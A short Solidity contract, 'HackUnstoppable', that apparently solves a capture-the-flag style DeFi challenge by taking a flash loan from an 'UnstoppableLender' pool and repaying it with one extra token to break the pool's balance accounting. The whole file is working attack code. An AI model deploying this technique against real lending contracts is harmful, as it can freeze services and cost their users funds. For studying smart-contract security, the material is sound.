pragma solidity ^0.6.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HackUnstoppable {
    UnstoppableLender private pool;
    address private owner;
    IERC20 public damnValuableToken;

    constructor(address poolAddress, address tokenAddress) public {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens() external {
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), uint256(1));
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        // Return all tokens to the pool
        require(
            IERC20(tokenAddress).transfer(msg.sender, amount + uint256(1)),
            "Transfer of tokens failed"
        );
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}
